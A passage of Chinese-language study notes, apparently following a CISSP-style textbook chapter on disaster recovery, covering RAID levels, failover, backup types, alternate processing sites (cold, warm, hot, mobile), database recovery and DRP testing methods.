团队必须在系统中提供足够的冗余。</p><p>如果强制要求零宕机，在连接到不同通信链路和基础设施的单独位置使用全冗余容灾切换服务器。</p><p>财务的限制，维持全冗余系统的方案并非总可行。</p><p>应该在本地零件库中保存尽可能多的零件以备快速替换（考虑盗窃，保存在安全的地方，签名领取）。</p><p>大规模基础设施故障需要注意的点：</p><ul><li>确保备用站点位于离主场所足够远的地方，从而使其不受同一灾难的影响。</li><li>组织会面对来自内部和外部的威胁，采取措施确保备用站点与主设施分开，从而防范这些威胁。</li><li>灾难往往不会有预警，确保备份站点做好准备，随时投入使用。</li></ul><h3 id="罢工-示威抗议"><a href="#罢工-示威抗议" class="headerlink" title="罢工&#x2F;示威抗议"></a>罢工&#x2F;示威抗议</h3><p>不要忘记人员因素在紧急事件计划中的重要性。</p><p>常被忽视的一种人为灾难可能是罢工或其他劳工危机。</p><p>BCP 和 DRP 团队应该考虑人员问题并提供出现劳工危机时的备选计划。</p><p>需要其他业务职能部门的投入和领导。</p><h3 id="偷窃-故意破坏"><a href="#偷窃-故意破坏" class="headerlink" title="偷窃&#x2F;故意破坏"></a>偷窃&#x2F;故意破坏</h3><p>偷窃和故意破坏的行为与恐怖行为具有相同点，只是规模小一些。</p><p>业务连续性 BCP 和 灾难恢复计划 DRP 应当包括充分的预防措施，从而控制偷窃&#x2F;故意破坏的发生频率，还应该包括紧急事件计划，以抑制偷窃和故意破坏行为对持续运营的影响。</p><h1 id="18-2-理解系统韧性、高可用性和容错能力"><a href="#18-2-理解系统韧性、高可用性和容错能力" class="headerlink" title="18.2 理解系统韧性、高可用性和容错能力"></a>18.2 理解系统韧性、高可用性和容错能力</h1><p>可用性是 CIA 三要素（保密性、完整性和可用性）的核心目标之一，而提升系统韧性和容错能力的技术控制会直接影响可用性。</p><p>系统韧性和容错能力的主要目标是消除关键业务系统中的单点故障。</p><p>任何组件都可能发生单点故障（single point of failure，SPOF），导致整个系统无法运行。</p><p>系统韧性（system resilience）是指系统在遭遇不利事件时保持可接受服务水平的能力。</p><p>韧性也会指系统在发生不利事件后恢复到先前状态的能力。</p><p>容错能力是指系统在发生故障的情况下任可继续运行的能力。</p><p>容错能力通过增加冗余组件实现的，如廉价磁盘冗余阵列 RAID</p><p>高可用性是指使用冗余技术组件，是系统能在经历短暂中断后快速从故障中恢复。</p><p>高可用性通过使用负载均衡和容灾切换服务器来实现。</p><p>技术人员通过系统可用时间的百分比来衡量这些控制的目标和有效性。</p><p>可用性要求越高，越难以满足。</p><p>要在一致性的基础上实现更高的可用性目标，需要使用高可用性、容错能力和系统韧性控制。</p><h2 id="18-2-1-保护硬盘驱动器"><a href="#18-2-1-保护硬盘驱动器" class="headerlink" title="18.2.1 保护硬盘驱动器"></a>18.2.1 保护硬盘驱动器</h2><p>向计算机中添加容错和系统恢复组件的常见方法是使用 RAID 阵列。</p><p>RAID 阵列包括两个或多个磁盘，即使其中一个磁盘损坏，大多数 RAID 还能继续运行。</p><p>常见 RAID 配置：</p><p><strong>RAID-0</strong>  也叫条带，使用两个或多个磁盘，提高磁盘子系统的性能，但不提供容错能力。</p><p><strong>RAID-1</strong>  也叫镜像，使用两个磁盘，每个磁盘保存相同的数据</p><p>可能会在不需要人工干预的情况下继续运行，也可能需要手动配置以使用没有损坏的磁盘。</p><p><strong>RAID-5</strong> 也叫带奇偶校验的条带，使用 3 个或更多磁盘，相当于一个包含奇偶校验信息的磁盘。</p><p>单个磁盘丢失，奇偶校验信息允许通过数学计算重建数据。</p><p>一个磁盘损坏，RAID 阵列继续运行，速度会变慢。</p><p><strong>RAID-6</strong>  提供另一种使用奇偶校验进行磁盘条带化的方法。</p><p>工作方式与 RAID-5 相同，但是在两个磁盘上存储奇偶校验信息，以防止两个单独的磁盘同时出现故障</p><p>至少需要 4 快磁盘。</p><p><strong>RAID-10</strong> 也叫 RAID1+0 或镜像条带。</p><p>配置为两个或多个镜像（RAID-1），每个镜像都配置为条带化（RAID-0）</p><p>至少需要 4 块磁盘，增加的磁盘以偶数计。</p><p>只要每个镜像中有好的磁盘，阵列就可以继续运行，如果某个镜像磁盘都故障，整个阵列将无法继续运行。</p><p><strong>容错与备份不同</strong></p><p>RAID 可以基于软件、也可以基于硬件。</p><p>基于软件：</p><p>需要操作系统管理，降低系统的整体性能，相对便宜。</p><p>基于硬件：</p><p>更有效，更可靠，但是成本较高</p><p>使用硬件阵列增加关键组件的可用性，收益大于成本。</p><p>基于硬件的 RAID 阵列通常含有可在逻辑上添加到磁盘阵列中的备份驱动器。</p><p>大多数基于硬件的阵列支持热插拔（不需要关闭系统电源）</p><h2 id="18-2-2-保护服务器"><a href="#18-2-2-保护服务器" class="headerlink" title="18.2.2 保护服务器"></a>18.2.2 保护服务器</h2><p>可以通过容灾切换集群将容错功能添加到关键服务器中。</p><p>容灾切换集群包含两个或多个服务器，一台故障，另一台自动切换承载服务。</p><p>容灾切换集群可以包含多台服务器，可以为多个服务或应用程序提供容错功能。</p><p>网络负载均衡主要用来增加系统的可扩展性，导致可以处理更多数据，但负载均衡也提供了容错能力。</p><p>如果正在使用云服务商提供的服务器，那么可以充分利用他们提供的容错服务。</p><p>设计云环境时，一定要考虑数据中心在世界各地的可用性，可以将负载的服务器放在不同物理区域和可用区（availability zone，AZ）中，使其兼具可扩展性和韧性。</p><h2 id="18-2-3-保护电源"><a href="#18-2-3-保护电源" class="headerlink" title="18.2.3 保护电源"></a>18.2.3 保护电源</h2><p>可使用 UPS、发电机或将两者结合起来为电源添加容错功能。</p><p>一般来说，UPS 只能短时间供电，持续时间在 5-30 分钟之间。</p><p>发电机提供长期电源。</p><p>UPS  的目标是在足够长的时间内供电，以完成系统的逻辑关机，或直到发电机通电并提供稳定的电源。</p><p>发电机在长期停电期间为系统供电。</p><p>发电机需要稳定的燃料供应，除了确保手头有足够的燃料，还应该采取措施确保在长期紧急情况下供应商仍然能定期提供燃料。</p><h2 id="18-2-4-可信恢复"><a href="#18-2-4-可信恢复" class="headerlink" title="18.2.4 可信恢复"></a>18.2.4 可信恢复</h2><p>可信恢复确保系统在发生故障或崩溃后，能够与之前一样安全。</p><p>恢复可以分为自动恢复和管理员手动干预恢复，系统的设计应该确保系统支持可信恢复。</p><p>系统可被预置成在损坏后处于失效关闭状态或故障开启状态，二者的选择取决于故障后更注重于安全性还是可用性。</p><p>失效关闭状态：</p><p>故障发生时默认转为关闭状态，禁止所有访问</p><p>故障开启状态：</p><p>故障发生时默认保持开放状态，授权所有访问。</p><p>可信解决方案实施的两个要素：</p><p>失败准备：可靠的备份解决方案，系统恢复及容错方法</p><p>系统恢复的过程：重新启动到非特权状态，恢复系统中所有受影响的文件和服务</p><p>通用标准（Common Criteria）包含可信恢复。</p><p>恢复过程与系统韧性及容错能力相关。</p><p>通用标准定义 4 种类型的可信恢复：<br><strong>手动恢复</strong></p><p>系统故障后，没有处于故障保护状态，需要管理员手动执行必要操作以实施安全或可信恢复。</p><p><strong>自动恢复</strong></p><p>对于至少一种类型的系统故障，系统能自动执行可信恢复。</p><p>一些类型的故障需要手动恢复。</p><p><strong>无不当损失的自动恢复</strong></p><p>类似于自动恢复，包括一些能够使特定对象免受损失的机制</p><p>方法包括：对数据及其他对象的恢复措施</p><p><strong>功能恢复</strong></p><p>支持功能恢复的系统能自动恢复某些功能。</p><p>确保系统成功地完成功能恢复，否则系统将恢复到变更前的故障防护状态。</p><h2 id="18-2-5-服务质量-QoS"><a href="#18-2-5-服务质量-QoS" class="headerlink" title="18.2.5 服务质量 QoS"></a>18.2.5 服务质量 QoS</h2><p>服务质量 QoS 控制能够保护负载下的数据网络可用性。</p><p>有助于提升服务质量的一些因素：</p><p><strong>带宽</strong>  可供通信的网络容量</p><p><strong>延迟时间</strong>  数据包从源到目的地所需的时间</p><p><strong>抖动（jitter）</strong>  不同数据包之间的延迟变化</p><p><strong>数据包丢失</strong>  一些数据包在从源到目的地的传送过程中可能丢失，需要重新传输</p><p><strong>干扰</strong>  电噪声、故障设备等因素可能会损坏数据包的内容</p><p>优先考虑对干扰容忍度小或较高业务需求的通信流，例如：会议室的视频流优先于实习生电脑的视频流</p><p>QoS 包括对特定类型通信流进行加密的要求。</p><h1 id="18-3-恢复策略"><a href="#18-3-恢复策略" class="headerlink" title="18.3 恢复策略"></a>18.3 恢复策略</h1><p>当灾难导致公司业务中断时，灾难恢复计划应该能几乎全自动起作用，并开始为恢复运营提供支持。</p><p>在正式 DRP 成员未到达现场时，第一批到达灾难现场的人员可以立即开展恢工作。</p><p>除了提高响应能力外，也可通过购买保险来减轻经济损失。</p><p>有价凭证的保险责任范围是记名的、打印的和书面的文档与手稿以及其他打印的业务记录提供保护。</p><h2 id="18-3-1-业务单元和功能优先级"><a href="#18-3-1-业务单元和功能优先级" class="headerlink" title="18.3.1 业务单元和功能优先级"></a>18.3.1 业务单元和功能优先级</h2><p>尽早恢复优先级别最高的业务单元。</p><p>必须识别和优化重要业务功能，定义恢复哪些功能以及恢复顺序。</p><p>业务连续性工作期间的业务影响分析 BIA 是极好的资源。</p><p>DRP 团队必须首先标识关键业务单元，并确定优先顺序。</p><p>主要业务单元并不需要执行所有的业务功能，最终结果可能是主要业务单元和其他可选业务单元的集合。</p><p>业务影响分析（BIA）当做业务连续性计划过程的一部分。</p><p>BIA 能够检测漏洞、制定策略以将风险降至最低，生成一份 BIA 报告以描述组织面临的潜在风险并确定重要的业务单于和功能。</p><p>BIA 评估故障可能造成的损失，包括现金流损失，更换设备费用、加班费等。</p><p>BIA 结果至少包含一张业务单元优先级列表。</p><p>在试图开始全面恢复运营前，最好在组织内恢复最高优先级业务单元 50% 的运营能力，之后继续恢复优先级较低的单元，使满足最小限度的运营能力。</p><p>关键业务流程和功能也必须确定故障恢复的运营要素，按照优先级顺序列出检查表，并列出风险和成本评估，以及恢复目标和重要事件。</p><p>平均恢复事件（MTTR）</p><p>最大允许中断时间（MTD）</p><p>恢复时间目标（RTO）</p><p>恢复点计划（RPO）</p><h2 id="18-3-2-危机管理"><a href="#18-3-2-危机管理" class="headerlink" title="18.3.2 危机管理"></a>18.3.2 危机管理</h2><p>持续进行培训，让员工知晓灾难恢复责任。</p><p>危机管理应该涵盖所有形式的危机，包括常见的灾难。</p><p>对技术影响不大的事件，如公共关系灾难，组织也可能启动危机管理计划。</p><p>危机管理是一门科学，也是一门艺术，预算允许的情况下，对主要员工进行危机培训。</p><h2 id="18-3-3-应急沟通"><a href="#18-3-3-应急沟通" class="headerlink" title="18.3.3 应急沟通"></a>18.3.3 应急沟通</h2><p>当灾难来袭时，组织必须能在内部以及与外界进行沟通。</p><p>应该指示参与灾难恢复工作的员工将媒体采访事务转给公共关系团队。</p><h2 id="18-3-4-工作组恢复"><a href="#18-3-4-工作组恢复" class="headerlink" title="18.3.4 工作组恢复"></a>18.3.4 工作组恢复</h2><p>设计灾难恢复计划时，目标是让工作组恢复到正常状态并且重新开始在日常工作地点的活动。</p><p>最好为不同的工作组修建单独的恢复设施。</p><h2 id="18-3-5-备用处理站点"><a href="#18-3-5-备用处理站点" class="headerlink" title="18.3.5 备用处理站点"></a>18.3.5 备用处理站点</h2><p>灾难恢复计划中最重要的要素之一是在主要站点不可用的时候选择备用处理站点。</p><h3 id="冷站点"><a href="#冷站点" class="headerlink" title="冷站点"></a>冷站点</h3><p>冷站点只是备用设施，足够大，可以解决组织的运营负荷，并有适当的电子和环境支持系统。</p><p>冷站点没有预先安装计算设施，也没有可供使用的网络通信线路。</p><p>冷站点最便宜，可能是最实用的，启用到使用通常需要数个星期时间，迅速恢复是不太可能的，由于需要大量时间、精力和费用，导致冷站点方法很难得到测试。</p><p>温站点包含数据链接，并为开始恢复运营而对设备进行了预先配置，但是没有可用数据信息。</p><p>热站点最昂贵，完全复制现有的业务基础设施，并且准备随时接管主站点。</p><h3 id="热站点"><a href="#热站点" class="headerlink" title="热站点"></a>热站点</h3><p>热站点和冷站点恰好相反。</p><p>热站点备用工作设施保持恒定的工作状态，配备完备的服务器、工作组和通信线路。</p><p>主站点服务器上的数据会定期或持续复制到热站点中对应的服务器上，从而确保热站点中所有数据都是最新的。</p><p>如果无法实时同步，使用以下三种选择启用热站点：</p><ul><li><p>如果在主站点关闭前有充足的时间，可在运营控制迁移前强制在两个站点之间进行数据复制。</p></li><li><p>如果无法进行数据复制，可将主站点事务日志的备份磁带搬到热站点，并以手工方式恢复自上次复制以来发生的事务。</p></li><li><p>如果没有任何可用的备份并且无法强制进行复制，那么灾难恢复团队只能允许丢失部分数据。</p><p>只有当损失在组织的恢复点目标（RPO）范围内时，才应该执行此操作。</p></li></ul><p>热站点成本非常高，参考方案：</p><p>1、选择使用外部承包商管理的共享热站点设施。存在发生大范围灾难时，外部承包商无法提供服务，需要在合同签署前以及合同生效期间解决这些问题。</p><p>2、把热站点用作开发或测试环境。</p><p>热站点需要和主站点具备相同级别的技术和物理安全机制。</p><h3 id="温站点"><a href="#温站点" class="headerlink" title="温站点"></a>温站点</h3><p>温站点是介于热站点和冷站点之间的中间场所。</p><p>包含快速建立运营体系所需的设备和数据线路。</p><p>温站点的设备通常是预先配置好的额，只是不包含客户端数据副本。</p><p>启用温站点，主要要求是将合适的备份介质送到温站点，并在备用服务上恢复重要数据。</p><p>启用温站点至少需要 12 个小时。</p><p>热站点的切换时间都是以秒或分钟计算，很少超过一两个小时。</p><p>温站点也可以通过共享基础设施获得，需要确保高需求时期，仍然有合适设施。</p><h3 id="移动站点"><a href="#移动站点" class="headerlink" title="移动站点"></a>移动站点</h3><p>移动站点属于非主流的替代方案。</p><p>移动站点通常由设备齐全的拖车或其他容易安置的单元组成。</p><p>移动站点拥有维持安全的计算环境所需的所有环境控制系统。</p><p>如果灾难恢复计划依赖于工作组的恢复策略，移动站点将会是实现的好方法。</p><p>移动站点一般配置为冷站点或温站点。</p><p>硬件替换储备选择：<br>1、内部其他位置仓库</p><p>2、供应商签署 SLA 约定</p><h3 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h3><p>在云中存储准备运行的镜像的方案是经济实惠的。</p><p>已经在云中运行其技术资源的组织不能无视灾难恢复问题，需要考虑云环境出现的问题。</p><h3 id="相互援助协议-MAA"><a href="#相互援助协议-MAA" class="headerlink" title="相互援助协议 MAA"></a>相互援助协议 MAA</h3><p>相互援助协议（mutual assistance agreement，MAA），也称为互惠协议。</p><p>文献中常见，实际很少采用。</p><p>在 MAA 下，两个组织承诺在灾难发生时通过共享计算设施或其他技术资源相互援助。</p><p>MAA 被设计成能提供冷战点、热站点、温站点等服务级别。</p><p>MAA 缺点：</p><ul><li>MAA 很难强制实施</li><li>相互合作的组织的地理位置应该相对接近，以方便员工在不同工作地奔走，但地理位置靠近意味着两个组织可能都遭受相同的威胁。</li><li>出于对保密性的考虑，公司通常会避免将自己的数据交给其他公司。</li></ul><p>对同一组织的两个内部单位或子公司来说，MAA 合适。</p><h2 id="18-3-6-数据库恢复"><a href="#18-3-6-数据库恢复" class="headerlink" title="18.3.6 数据库恢复"></a>18.3.6 数据库恢复</h2><p>务必将数据库恢复技术纳入灾难恢复计划。</p><p>需要将数据库专家纳入 DRP 团队。</p><h3 id="电子链接"><a href="#电子链接" class="headerlink" title="电子链接"></a>电子链接</h3><p>数据库备份通过批量传送的方式转移到远处的某个场所。</p><p>远处场所可以是专用的备用恢复站点，也可以是公司或承包商管理维护数据的离站场所。</p><p>使用电子链接，需要注意，从灾难发生到数据正常使用，可能有相当长的时间延迟。</p><p>在考虑与供应商签订电子链接合同时，应该坚决要求对所提供服务进行书面定义，包括存储容量、通信带宽等。</p><p>需要定期测试电子链接设置。</p><p>电子链接存在丢失重要数据的可能性，只能 恢复截止上次链接时的信息。</p><h3 id="远程日志处理"><a href="#远程日志处理" class="headerlink" title="远程日志处理"></a>远程日志处理</h3><p>远程日志处理以一种更快的方式传输数据。</p><p>数据传输以批量方式进行，但更频繁，通常每小时或更短时间一次。</p><p>传输数据库备份文件时，也会传输数据库事务日志的副本，包括从上次批量传输以来发生的事务。</p><p>传输到远程的事务日志不会被应用于实际数据库服务器。</p><h3 id="远程镜像"><a href="#远程镜像" class="headerlink" title="远程镜像"></a>远程镜像</h3><p>远程镜像是最先进的数据库备份解决方案。</p><p>也是最昂贵的。</p><p>实时数据库服务器在备份站点进行维护，操作主站点数据库时，同步操作远程服务器。</p><p>镜像服务器一接到通知就做好接管运营的角色。</p><p>远程镜像是一种流行的数据库备份策略，适用于寻求实施热站点的组织。</p><p>衡量远程镜像解决方案可行性时，需要考虑成本。</p><p>基于云的数据库平台可能内置了冗余功能，但是需要考虑特定服务的局限性。</p><h1 id="18-4-恢复计划开发"><a href="#18-4-恢复计划开发" class="headerlink" title="18.4 恢复计划开发"></a>18.4 恢复计划开发</h1><p>一旦为组织建立业务单元优先级并获得合适的备份恢复站点办法，起草实际的灾难恢复计划。</p><p>DRP 需要反复修改文档，已满足关键业务单元的运营需求。</p><p>DRP 需要考虑灾难恢复预算和可用人员对资源、时间和费用的限制。</p><p>灾难恢复计划 DRP 需要考虑的文档类型：</p><ul><li>执行概要，提供对计划的高度概括</li><li>具体部门的计划</li><li>针对负责实现和维护关键备份系统的 IT 技术人员的技术指南</li><li>针对灾难恢复团队人员的检查</li><li>为灾难恢复团队重要成员准备完整计划副本</li></ul><p>在灾难发生或即将来临时，务必使用特别定制的文档。</p><p>灾害恢复团队的重要成员有一份检查表，在混乱的环境中指导行为。</p><p>IT 人员有一份技术指南，帮助建立和启动备用站点。</p><p>经理和公关人员有一份简单文档，了解当前的灾难恢复工作是如何协调的。</p><h2 id="18-4-1-应急响应"><a href="#18-4-1-应急响应" class="headerlink" title="18.4.1 应急响应"></a>18.4.1 应急响应</h2><p>灾难恢复计划 DRP 应该包含重要人员在识别出灾难或灾难即将来临时应该立即遵守的简单清晰指令。</p><p>应急响应计划通常以检查表的形式放在一起，交给响应者。</p><p><strong>对检查表的任务进行优先级安排，最重要的任务必须排在第一位。</strong></p><p>记住确保检查表将在危机发生时被执行。</p><p>可能无法完成所有检查任务，必须把最重要的任务放在检查表第一位，列表中级别越低的条目，无法完成的可能性就越大。</p><p>响应计划应该包括启动灾难恢复计划的明确标准，定义谁有权宣布灾难，然后讨论通知程序。</p><h2 id="18-4-2-职员和通信"><a href="#18-4-2-职员和通信" class="headerlink" title="18.4.2 职员和通信"></a>18.4.2 职员和通信</h2><p>灾难恢复计划中应该包括一份人员列表，以便在发生灾难时进行联络。</p><p>人员列表包括灾难恢复计划 DRP 团队重要成员和执行关键人员的人员。</p><p>响应表应该包括备用联系方式，同时需要一个通讯录备份，也就是替补人员。</p><p>灾难发生时，检查表是非常宝贵的工具。</p><p>收集和分发电话通知列表前，一定要询问组织内负责隐私问题人员的意见，可能需要遵守特殊的政策。</p><p>通知检查表应该提供给所有可能对灾难做出响应的人员，能够迅速通知到关键人员。</p><p>以“电话树”形式组织通知表，需要添加安全网，让每条链中的最后一人联系第一个人，确保都通知到。</p><h2 id="18-4-3-评估"><a href="#18-4-3-评估" class="headerlink" title="18.4.3 评估"></a>18.4.3 评估</h2><p>当灾难恢复团队抵达现场时，首要任务之一就是评估现状。</p><p>以滚动方式进行，先进行非常简单的评估、分类活动并启动灾难响应流程，随着事件发展，进行更详细的评估，用于衡量灾难恢复工作的有效性以及资源分配的优先级。</p><h2 id="18-4-4-备份和离站存储"><a href="#18-4-4-备份和离站存储" class="headerlink" title="18.4.4 备份和离站存储"></a>18.4.4 备份和离站存储</h2><p>备份是存储在磁带、磁盘、云或其他介质上的数据拷贝，是最后的恢复选项。</p><p>灾难恢复计划 DRP 应该完整地说明组织要求的备份策略。</p><h3 id="三种主要的备份类型"><a href="#三种主要的备份类型" class="headerlink" title="三种主要的备份类型"></a>三种主要的备份类型</h3><h4 id="完整备份"><a href="#完整备份" class="headerlink" title="完整备份"></a>完整备份</h4><p>完整备份存储受保护设备包括数据的整个副本。</p><p>完整备份完成，每个文件的归档位都会被重置、关闭或设置为 0 .</p><h4 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h4><p>增量备份只复制自最近一次完整备份或增量备份以来修改的文件。</p><p>增量备份只复制归档位被打开、启用或设置为 1 的文件。</p><p>完整增量备份，被复制的文件归档位都会被重置、关闭或设置为 0 .</p><h4 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h4><p>差异备份复制自最近一次完整备份以来修改过的所有文件。</p><p>只复制归档位被打开、启用或设置为 1 的文件。</p><p>差异备份过程并不改变归档位。</p><h4 id="增量备份和差异备份区别"><a href="#增量备份和差异备份区别" class="headerlink" title="增量备份和差异备份区别"></a>增量备份和差异备份区别</h4><p>差异备份的还原时间短，备份所需时间比增量备份长。</p><p>差异备份：还原两个备份，最近的完整备份和最近的差异备份</p><p>增量备份：还原多个备份，最近的完整备份和从完整备份到现在的所有增量备份</p><p>备份介质的存储同样至关重要。</p><p>主运营中心或附近备份一份，离站或云保管备份介质的副本。</p><p>备份策略一般会使用多种备份，并循环使用存储介质</p><p>比较常见的备份策略是：每个周末进行一次完整备份，并于每天晚上进行增量备份或差异备份。</p><p>具体备份方式和流程，取决于 RPO 值，如果无法容忍少量数据丢失，那么容错的能力就较低。</p><h3 id="磁盘到磁盘备份"><a href="#磁盘到磁盘备份" class="headerlink" title="磁盘到磁盘备份"></a>磁盘到磁盘备份</h3><p>灾难恢复策略中应用磁盘到磁盘（disk-to-disk，D2D）备份方式。</p><p>许多备份技术是围绕磁带范式设计的。</p><p>虚拟磁带库（VTL）通过使用软件把磁盘存储虚拟成磁带，使备份软件可以使用此型号的磁盘。</p><p>采用完整的磁盘到磁盘备份方法的组织必须确保地理多样性，磁盘需要异地保存，托管服务管理远程备份位置或使用云备份。</p><h3 id="最佳备份实践"><a href="#最佳备份实践" class="headerlink" title="最佳备份实践"></a>最佳备份实践</h3><p>备份应当安排在空闲时间（如晚上）进行。</p><p>需要在备份解决方案中设计足够的容量来处理合理时间段（取决于具体环境和预算）内备份数据的增长。</p><p>为避免定期备份间隔数据丢失的问题，可以部署某些实时连续的备份形式，例如：RAID，集群或服务器镜像。</p><p>仅在备份中包含必要的信息。</p><p>需要测试组织的恢复流程，避免恢复尝试失败。</p><h3 id="磁带轮换"><a href="#磁带轮换" class="headerlink" title="磁带轮换"></a>磁带轮换</h3><p>备份常用的几种磁带轮换策略包括：</p><ul><li>祖父-父亲-儿子（grandfather-father-son，GFS）策略</li><li>汉诺塔策略</li><li>六带轮换策略</li></ul><p>策略通过人工或商用备份软件或自动化分层存储管理（hierarchical  storage management，HSM）系统来自动实现。</p><p>HSM 系统是自动化的机械备份换带机，由 32 或 64 个光学或磁带备份设备组成。</p><p>HSM 系统中所有驱动原件都被配置为单个驱动器阵列（类似 RAID）</p><h2 id="18-4-5-软件托管协议"><a href="#18-4-5-软件托管协议" class="headerlink" title="18.4.5 软件托管协议"></a>18.4.5 软件托管协议</h2><p>软件托管协议是一种特殊的工具。</p><p>集中精力与那些规模太小、有可能破产的软件供应商协商托管协议。</p><p>如果组织依赖定制开发的软件或小公司开发的软件，需要考虑将这类协议作为灾难恢复计划的一部分。</p><p>在软件托管协议下，软件开发商将应用程序源代码的副本提供给独立的第三方。</p><p>第三方用安全的方式更新源代码副本。</p><p>当触发事件时，最终用户可以通过分析源代码来解决应用程序的问题或升级软件。</p><h2 id="18-4-6-公用设施"><a href="#18-4-6-公用设施" class="headerlink" title="18.4.6 公用设施"></a>18.4.6 公用设施</h2><p>灾难恢复计划 DRP 应该包含公用设施联系信息和措施，以解决公用设施服务在灾难发生时出现的问题。</p><h2 id="18-4-7-物流和供应"><a href="#18-4-7-物流和供应" class="headerlink" title="18.4.7 物流和供应"></a>18.4.7 物流和供应</h2><p>灾难恢复操作过程中有关物流的问题值得关注。</p><p>灾难恢复计划 DRP 应该包含物流和供应的条款。</p><h2 id="18-4-8-恢复与还原的比较"><a href="#18-4-8-恢复与还原的比较" class="headerlink" title="18.4.8 恢复与还原的比较"></a>18.4.8 恢复与还原的比较</h2><p>有必要区分灾难恢复任务和灾难还原任务。</p><p>恢复涉及将业务运营和流程还原至工作状态。</p><p>还原涉及将业务设施和环境还原至可工作状态。</p><p>灾难恢复团队可操作的时间很短，必须尽可能迅速地应用灾难恢复计划 DRP 并还原 IT 能力。也及时必须在 MTD&#x2F;RTO 内还原业务。</p><p>抢救团队在原有站点安全的情况下开展工作，需要将公司完全还原至最初的能力状态，必要时还原到原始位置，如果原始位置不存在，则选择新地点。</p><p>抢救团队必须重建或修复 IT 基础设施。</p><p>抢救团队的工作时间多于恢复团队的工作时间。</p><p>抢救团队必须确保新的 IT 基础设施的可靠性。（先将最小关键任务进出还原到原有站点，进行压力测试，确定没问题，进行后续迁移）</p><p>只有在全部的正常运营都还原到原有站点后，才能宣告紧急状态结束。</p><p>需要在主站点恢复运营，并终止灾难恢复约定下的任何处理站点运营。</p><p>灾难恢复计划 DRP 应当指定返回主站点的标准。</p><h1 id="18-5-培训、意识与文档记录"><a href="#18-5-培训、意识与文档记录" class="headerlink" title="18.5 培训、意识与文档记录"></a>18.5 培训、意识与文档记录</h1><p>也业务连续性计划 BCP 一样，必须对所有涉及灾难恢复工作人员进行培训。</p><p>针对不同角色制定培训要求。</p><p>制定培训计划需要考虑的要素：</p><ul><li>对全体新员工进行入职培训</li><li>对第一次担任灾难恢复角色的员工进行初始培训</li><li>对灾难恢复团队的成员进行详细的再培训</li><li>对所有的其他员工进行简要的意识培训。</li></ul><p>灾难恢复计划应该进行完整的文档记录。</p><p>一定要实现必要的文档记录程序，并在计划发生变化后修订文档。</p><p>DRP 应该被视为极其敏感的文档，并且只在职责分离和因需可知的基础上提供给个人。</p><p>务必确保 DRP 团队关键成员和高级管理人员知晓整个计划和理解高级实施细节。</p><p>一定要保存足够的最新纸质计划副本。</p><h1 id="18-6-测试与维护"><a href="#18-6-测试与维护" class="headerlink" title="18.6 测试与维护"></a>18.6 测试与维护</h1><p>每种灾难恢复计划都必须定期进行测试，以确保计划的条款是可行的并符合组织变化的需求。</p><h2 id="18-6-1-通读测试"><a href="#18-6-1-通读测试" class="headerlink" title="18.6.1 通读测试"></a>18.6.1 通读测试</h2><p>通读测试（read-through test）是最简单的，也是最重要的一种测试。</p><p>向灾难恢复团队分发灾难恢复计划的副本，并要求进行审查。</p><p>可以实现三个目标：</p><ul><li>计划确保关键人员意识到他们的职责并定期复习知识。</li><li>为人员提供了审查计划中有过时信息的机会，并根据组织的变化更新需要修改的内容。</li><li>计划有助于标识重要人员离开公司，没有人负责重新分配的灾难恢复计划，所以需要将灾难恢复职责纳入岗位描述的重要原因。</li></ul><h2 id="18-6-2-结构化演练"><a href="#18-6-2-结构化演练" class="headerlink" title="18.6.2 结构化演练"></a>18.6.2 结构化演练</h2><p>结构化演练（structured walk-through）执行进一步的测试，也称为桌面演练。</p><p>针对不同确切的灾难情景，成员通过参考灾难恢复技术对特定的灾难进行讨论，得出适当的响应方法。</p><p>一些演练包括采取物理动作或至少考虑其对演练的影响。例如：回家参加演练。</p><h2 id="18-6-3-模拟测试"><a href="#18-6-3-模拟测试" class="headerlink" title="18.6.3 模拟测试"></a>18.6.3 模拟测试</h2><p>模拟测试（simulation test）与结构化演练类似。</p><p>模拟测试向灾难恢复团队成员呈现情景并要求做出适当的响应。</p><p>模拟测试会对某些响应措施进行测试，可能会中断非关键的业务活动并使用某些运营人员。</p><h2 id="18-6-4-并行测试"><a href="#18-6-4-并行测试" class="headerlink" title="18.6.4 并行测试"></a>18.6.4 并行测试</h2><p>并行测试（parallel test）表示下一层级的测试，涉及将实际人员重新部署到备用恢复站点并实施站点启动过程。</p><p>测试不会中断主要设施的运营，主要设施仍然处理组织的业务。</p><h2 id="18-6-5-完全中断测试"><a href="#18-6-5-完全中断测试" class="headerlink" title="18.6.5 完全中断测试"></a>18.6.5 完全中断测试</h2><p>完全中断测试（full-interruption test）与并行测试的操作方式类似，但是涉及实际关闭主站点的运营并将其转移至恢复站点，测试完成后，在主站点执行恢复运营的反向过程。</p><p>完全中断测试有很大的风险，非常难以安排，会遭到管理层的阻力。</p><h2 id="18-6-6-经验教训"><a href="#18-6-6-经验教训" class="headerlink" title="18.6.6 经验教训"></a>18.6.6 经验教训</h2><p>灾难恢复行动或其他安全事件后，应该举行总结经验教训的会议。</p><p>改进事件响应过程和技术的机会，以更好应对未来的安全危机。</p><p>时间是经验总结会议的关键，经验总结会议越早越好，可以得到有价值的反馈。</p><p>总结经验教训的问题：</p><ul><li>到底发生了什么？什么时候发生的？</li><li>员工和管理层在处理事件方面表现如何？</li><li>是否遵循了文件化的程序？</li><li>程序是否足够？</li><li>是否采取了可能阻碍恢复的步骤或行动？</li><li>下次发生类似事件时，员工和管理层会采取哪些不同的措施？</li><li>如何改进和其他组织的信息共享？</li><li>哪些纠正措施可以防止将来发生类似事件？</li><li>未来应该注意哪些前兆和指标来检测类似事件？</li><li>需要哪些额外的工具或资源来检测、分析和抑制未来的风险事件？</li></ul><p>主持人保持中立，与团队负责人合作，将经验教训记录在报告中，包括改进流程的建议。</p><h2 id="18-6-7-维护"><a href="#18-6-7-维护" class="headerlink" title="18.6.7 维护"></a>18.6.7 维护</h2><p>灾难恢复计划 DRP 是一份活的文档。</p><p>必须对灾难恢复计划 DRP 进行适当的修改以适应组织变化。</p><p>细微变化电话或电子邮件进行。</p><p>重大变化需要整个灾难恢复团队多次会议商讨。</p><p>灾难恢复计划和所需要的材料都必须遵守相关法律法规并反映业务需求。</p><p>应用正式的变更管理流程。</p><p>定期进行消防训练和演练来确保 DRP 的所有元素都被正确使用，从而对所有职员进行培训。</p><p>每次设计、实施和记录变更时，都需要重复过程和演练。</p><p>一定要了解所有设施的位置，并确保灾难恢复计划 DRP 